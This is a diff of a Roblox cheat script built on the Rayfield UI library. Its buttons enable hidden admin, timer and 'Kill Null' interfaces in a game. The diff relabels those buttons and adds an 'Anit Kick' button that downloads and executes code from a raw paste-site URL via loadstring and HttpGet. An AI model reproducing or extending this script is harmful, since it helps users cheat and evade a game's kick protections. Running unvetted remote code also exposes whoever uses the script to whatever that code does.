@@ -40,14 +40,14 @@ local Window = Rayfield:CreateWindow({
 local MainTab = Window:CreateTab("Gui", nil) -- Title, Image
 
 local MainButton = MainTab:CreateButton({
-   Name = "Admin Panel",
+   Name = "Admin Panel (First Anit Kick)",
    Callback = function()
    game:GetService("Players").LocalPlayer.PlayerGui.AdminPanelNULL.Enabled = true
    end,
 })
 
 local MainButton = MainTab:CreateButton({
-   Name = "Time",
+   Name = "Time (First Anit Kick)",
    Callback = function()
    game:GetService("Players").LocalPlayer.PlayerGui.TimerGui.Enabled = true
    game:GetService("Players").LocalPlayer.PlayerGui.TimerGui.ResetOnSpawn = false
@@ -55,9 +55,16 @@ local MainButton = MainTab:CreateButton({
 })
 
 local MainButton = MainTab:CreateButton({
-   Name = "Kill Null directly",
+   Name = "Kill Null directly (First Anit Kick)",
    Callback = function()
    game:GetService("Players").LocalPlayer.PlayerGui.KillNull.Enabled = true
+   end,
+})
+
+local MainButton = MainTab:CreateButton({
+   Name = "Anit Kick (By Verosv)",
+   Callback = function()
+   loadstring(game:HttpGet("https://pastefy.app/puryVwow/raw"))()
    end,
 })
 
